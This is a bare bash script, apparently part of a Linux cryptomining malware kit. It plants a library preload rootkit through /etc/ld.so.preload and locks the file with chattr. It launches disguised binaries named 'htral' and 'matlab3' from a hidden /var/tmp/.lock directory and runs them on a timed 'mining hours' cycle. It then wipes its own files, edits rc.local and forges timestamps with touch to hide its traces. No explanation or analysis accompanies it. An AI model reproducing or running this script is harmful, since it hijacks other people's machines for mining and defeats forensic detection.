#!/bin/bash
export PATH=$PATH:/usr/bin:/bin:/usr/local/bin:.:/usr:.
PATH=$PATH:/usr/bin:/bin:/usr/local/bin:.:/usr:.
rm -rf /tmp/matlab2 2>/dev/null
#if mining hours
mkfifo /tmp/fifo
exec 3<> /tmp/fifo
chattr -a /etc/ld.so.preload 2>/dev/null
rm -rf /etc/ld.so.preload 2>/dev/null
killall -9 "htral" 2>/dev/null
/usr/bin/killall -9 "htral" 2>/dev/null
chattr -ai /bin/htral
cp /etc/ld.ba /etc/ld.so.preload 2>/dev/null
chmod 777 /etc/ld.so.preload 2>/dev/null
chattr +a /etc/ld.so.preload 2>/dev/null
cd /var/tmp/.lock
cp -f /var/tmp/.lock/cpa.h /bin/htral 2>/dev/null
/bin/htral -t `cat /var/tmp/.lock/tca.c` 2>/dev/null
cd ~/ 2>/dev/null
sleep 5
rm -rf /bin/htral 2>/dev/null
killall -9 "matlab3" 2>/dev/null
/usr/bin/killall -9 "matlab3" 2>/dev/null
chattr -ai /tmp/matlab3
cp -f /var/tmp/.lock/libvo /tmp/matlab3 2>/dev/null
/usr/bin/nohup /tmp/matlab3 &2>/dev/null
rm -rf /tmp/nohup.out 2>/dev/null
rm -rf /root/nohup.out 2>/dev/null
rm -rf /bin/htral 2>/dev/null
rm -rf /bin/nohup.out 2>/dev/null
rm -rf /var/tmp/.lock/nohup.out 2>/dev/null
read -t 32400 -u 3 var
mkfifo /tmp/fifo
exec 3<> /tmp/fifo
chattr -a /etc/ld.so.preload 2>/dev/null
rm -rf /etc/ld.so.preload 2>/dev/null
killall -9 "htral" 2>/dev/null
/usr/bin/killall -9 "htral" 2>/dev/null
cp /etc/ld.ba /etc/ld.so.preload 2>/dev/null
chmod 777 /etc/ld.so.preload 2>/dev/null
chattr +a /etc/ld.so.preload
echo free
read -t 10 -u 3 var
chattr -a /etc/ld.so.preload 2>/dev/null
rm -rf /etc/ld.so.preload 2>/dev/null
pkill -9 matlab3 2>/dev/null
rm -rf /etc/ld.ba 2>/dev/null
rm -rf /lib64/library1.so 2>/dev/null
rm -rf /usr/lib64/library1.so 2>/dev/null
rm -rf /var/tmp/.lock/cpa.h 2>/dev/null
rm -rf /var/tmp/.lock/libvo 2>/dev/null
rm -rf /var/tmp/.lock/ologs 2>/dev/null
rm -rf /var/tmp/.lock 2>/dev/null
rm -rf /tmp/loadavg 2>/dev/null  
rm -rf /tmp/stat 2>/dev/null  
rm -rf /tmp/fifo 2>/dev/null  
rm -rf /var/tmp/.lock/geolog 2>/dev/null  
rm -rf /var/tmp/.lock/tca.c 2>/dev/null  
cat /etc/rc.d/rc.local|grep -v "ld.so.preload" > /tmp/l;mv /tmp/l /etc/rc.d/rc.local; 2>/dev/null
chmod +x /etc/rc.d/rc.local 2>/dev/null 
touch -acmr /bin/login /etc/rc.d/rc.local 2>/dev/null  
killall -9 "matlab3" 2>/dev/null
/usr/bin/killall -9 "matlab3" 2>/dev/null
exit
